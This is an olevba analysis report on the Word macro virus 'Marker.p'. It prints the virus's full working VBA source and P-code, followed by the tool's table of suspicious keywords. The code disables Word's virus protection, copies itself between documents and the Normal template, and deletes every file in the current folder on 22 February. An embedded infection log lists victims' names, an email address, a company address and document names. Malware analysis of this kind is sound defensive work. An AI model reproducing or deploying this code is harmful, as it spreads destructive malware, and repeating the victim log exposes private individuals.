olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()

On Error Resume Next

Const Murder = "<-- Its Murder!!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim rep As Integer
Dim virusCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.codemodule.Find(Murder, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.codemodule.Find(Murder, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False
Options.SaveNormalPrompt = False



'PayLoad
Delivery:
If Day(Now()) = 22 And Month(Now()) = 2 Then
       Kill "*.*":
       rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
       GoTo Delivery
       End If
       
'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   


'.......................................................................................
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
  virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    LogData = Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM -") & _
                     Format(Date, "dddd,d mmm,yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & Application.UserAddress & Chr(13) & _
              "' " & Application.ActiveDocument & Chr(13)
              
              
    virusCode = virusCode & LogData
   

    nt.codemodule.DeleteLines 1, nt.codemodule.countoflines
    nt.codemodule.AddFromString virusCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
 
End If



'..........................................................................................
  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines)

    ad.codemodule.DeleteLines 1, ad.codemodule.countoflines
    ad.codemodule.AddFromString virusCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    End If



End Sub


' Potential Murder Victims  "Marked for death...If I kiss you now, you'll probably die later..."
'

' 12:00:00 AM -Thursday,6 May,1999
' Ryde or Die
' The world
' ThE GeNiUs.doc

' 06:27:03 PM -Thursday,6 May,1999
' Valued Gateway Customer
'
' 1st Trial.doc



' 10:10:56 AM -Friday,7 May,1999
' Valued Gateway Customer
'
' 1st Trial.doc



' 02:33:34 PM -Saturday,8 May,1999
' Matthew E. Dawson
'
' Psychology paper.doc



' 08:17:21 PM -Wednesday,12 May,1999
' administrator
'
' str.doc



' 05:03:30  -Tuesday,6 Jul,1999
' VANDAMME CHRISTOPHE
'
' cv-0699.doc



' 01:24:15  -Wednesday,7 Jul,1999
' DUFLOT Jean Marc
'
' AUG-CCB-1.doc



' 03:52:40  -Friday,9 Jul,1999
' von Erlach Burkhart
'
' LETCOMV6.doc



' 03:54:51  -Tuesday,13 Jul,1999
' DESIE GODELIEVE
'
' Marches99.DOC



' 06.39.31  -lunedì,19 lug,1999
' Marco Pignagnoli
' marco@aidnetwork.com
' F25C.doc



' 03:10:51  -vendredi,23 juil,1999
' Viviane Burgess
'
' contract.doc



' 11:10:46  -Tuesday,28 Sep,1999
' Isabelle Adam
'
' 20_copper 17aout99.doc



' 09:06:28  -Mittwoch,6 Okt,1999
' Smida
'
' Agenda eu.doc



' 11:00:51  -Freitag,15 Okt,1999
' Straganz
' KRONE Ges.m.b.H.
Kroneplatz 1

A-2521 Trumau
' Auditprogrogramm_Krone.doc


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9580 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x0010 "<-- Its Murder!!"
' 	VarDefn Murder
' Line #6:
' Line #7:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #8:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #10:
' 	Dim 
' 	VarDefn rep (As Integer)
' Line #11:
' 	Dim 
' 	VarDefn virusCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #16:
' Line #17:
' 	Ld Murder 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #18:
' 	Ld Murder 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #19:
' Line #20:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' 	QuoteRem 0x0000 0x0007 "PayLoad"
' Line #27:
' 	Label Delivery 
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #29:
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' Line #30:
' 	LitStr 0x000C "That's Right"
' 	Ld vbOK 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000B "It's Murder"
' 	ArgsLd MsgBox 0x0003 
' 	St rep 
' Line #31:
' 	GoTo Delivery 
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #35:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' 	QuoteRem 0x0000 0x0057 "......................................................................................."
' Line #40:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #41:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #42:
' Line #43:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #44:
' Line #45:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St virusCode 
' Line #46:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #47:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #48:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #49:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #50:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	ElseBlock 
' Line #53:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' Line #57:
' 	LineCont 0x0014 07 00 0E 00 10 00 15 00 1C 00 0E 00 27 00 0E 00 32 00 0E 00
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000F "hh:mm:ss AMPM -"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x000F "dddd,d mmm,yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St LogData 
' Line #58:
' Line #59:
' Line #60:
' 	Ld virusCode 
' 	Ld LogData 
' 	Concat 
' 	St virusCode 
' Line #61:
' Line #62:
' Line #63:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #64:
' 	Ld virusCode 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #65:
' Line #66:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #67:
' Line #68:
' Line #69:
' 	EndIfBlock 
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' 	QuoteRem 0x0000 0x005A ".........................................................................................."
' Line #74:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #75:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #76:
' Line #77:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #78:
' Line #79:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St virusCode 
' Line #80:
' Line #81:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #82:
' 	Ld virusCode 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #83:
' Line #84:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #85:
' Line #86:
' 	EndIfBlock 
' Line #87:
' Line #88:
' 	EndIfBlock 
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' Line #95:
' 	QuoteRem 0x0000 0x005F " Potential Murder Victims  "Marked for death...If I kiss you now, you'll probably die later...""
' Line #96:
' 	QuoteRem 0x0000 0x0000 ""
' Line #97:
' Line #98:
' 	QuoteRem 0x0000 0x0021 " 12:00:00 AM -Thursday,6 May,1999"
' Line #99:
' 	QuoteRem 0x0000 0x000C " Ryde or Die"
' Line #100:
' 	QuoteRem 0x0000 0x000A " The world"
' Line #101:
' 	QuoteRem 0x0000 0x000F " ThE GeNiUs.doc"
' Line #102:
' Line #103:
' 	QuoteRem 0x0000 0x0021 " 06:27:03 PM -Thursday,6 May,1999"
' Line #104:
' 	QuoteRem 0x0000 0x0018 " Valued Gateway Customer"
' Line #105:
' 	QuoteRem 0x0000 0x0000 ""
' Line #106:
' 	QuoteRem 0x0000 0x000E " 1st Trial.doc"
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' 	QuoteRem 0x0000 0x001F " 10:10:56 AM -Friday,7 May,1999"
' Line #111:
' 	QuoteRem 0x0000 0x0018 " Valued Gateway Customer"
' Line #112:
' 	QuoteRem 0x0000 0x0000 ""
' Line #113:
' 	QuoteRem 0x0000 0x000E " 1st Trial.doc"
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' 	QuoteRem 0x0000 0x0021 " 02:33:34 PM -Saturday,8 May,1999"
' Line #118:
' 	QuoteRem 0x0000 0x0012 " Matthew E. Dawson"
' Line #119:
' 	QuoteRem 0x0000 0x0000 ""
' Line #120:
' 	QuoteRem 0x0000 0x0015 " Psychology paper.doc"
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' 	QuoteRem 0x0000 0x0023 " 08:17:21 PM -Wednesday,12 May,1999"
' Line #125:
' 	QuoteRem 0x0000 0x000E " administrator"
' Line #126:
' 	QuoteRem 0x0000 0x0000 ""
' Line #127:
' 	QuoteRem 0x0000 0x0008 " str.doc"
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' 	QuoteRem 0x0000 0x001E " 05:03:30  -Tuesday,6 Jul,1999"
' Line #132:
' 	QuoteRem 0x0000 0x0014 " VANDAMME CHRISTOPHE"
' Line #133:
' 	QuoteRem 0x0000 0x0000 ""
' Line #134:
' 	QuoteRem 0x0000 0x000C " cv-0699.doc"
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' 	QuoteRem 0x0000 0x0020 " 01:24:15  -Wednesday,7 Jul,1999"
' Line #139:
' 	QuoteRem 0x0000 0x0011 " DUFLOT Jean Marc"
' Line #140:
' 	QuoteRem 0x0000 0x0000 ""
' Line #141:
' 	QuoteRem 0x0000 0x000E " AUG-CCB-1.doc"
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' 	QuoteRem 0x0000 0x001D " 03:52:40  -Friday,9 Jul,1999"
' Line #146:
' 	QuoteRem 0x0000 0x0014 " von Erlach Burkhart"
' Line #147:
' 	QuoteRem 0x0000 0x0000 ""
' Line #148:
' 	QuoteRem 0x0000 0x000D " LETCOMV6.doc"
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' 	QuoteRem 0x0000 0x001F " 03:54:51  -Tuesday,13 Jul,1999"
' Line #153:
' 	QuoteRem 0x0000 0x0010 " DESIE GODELIEVE"
' Line #154:
' 	QuoteRem 0x0000 0x0000 ""
' Line #155:
' 	QuoteRem 0x0000 0x000E " Marches99.DOC"
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' 	QuoteRem 0x0000 0x001E " 06.39.31  -lunedì,19 lug,1999"
' Line #160:
' 	QuoteRem 0x0000 0x0011 " Marco Pignagnoli"
' Line #161:
' 	QuoteRem 0x0000 0x0015 " marco@aidnetwork.com"
' Line #162:
' 	QuoteRem 0x0000 0x0009 " F25C.doc"
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' 	QuoteRem 0x0000 0x0021 " 03:10:51  -vendredi,23 juil,1999"
' Line #167:
' 	QuoteRem 0x0000 0x0010 " Viviane Burgess"
' Line #168:
' 	QuoteRem 0x0000 0x0000 ""
' Line #169:
' 	QuoteRem 0x0000 0x000D " contract.doc"
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' 	QuoteRem 0x0000 0x001F " 11:10:46  -Tuesday,28 Sep,1999"
' Line #174:
' 	QuoteRem 0x0000 0x000E " Isabelle Adam"
' Line #175:
' 	QuoteRem 0x0000 0x0000 ""
' Line #176:
' 	QuoteRem 0x0000 0x0017 " 20_copper 17aout99.doc"
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' 	QuoteRem 0x0000 0x001F " 09:06:28  -Mittwoch,6 Okt,1999"
' Line #181:
' 	QuoteRem 0x0000 0x0006 " Smida"
' Line #182:
' 	QuoteRem 0x0000 0x0000 ""
' Line #183:
' 	QuoteRem 0x0000 0x000E " Agenda eu.doc"
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' 	QuoteRem 0x0000 0x001F " 11:00:51  -Freitag,15 Okt,1999"
' Line #188:
' 	QuoteRem 0x0000 0x0009 " Straganz"
' Line #189:
' 	QuoteRem 0x0000 0x0011 " KRONE Ges.m.b.H."
' Line #190:
' 	LitDI2 0x0001 
' 	ArgsCall Kroneplatz 0x0001 
' Line #191:
' Line #192:
' 	Reparse 0x000D "A-2521 Trumau"
' Line #193:
' 	QuoteRem 0x0000 0x001B " Auditprogrogramm_Krone.doc"
' Line #194:
' Line #195:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

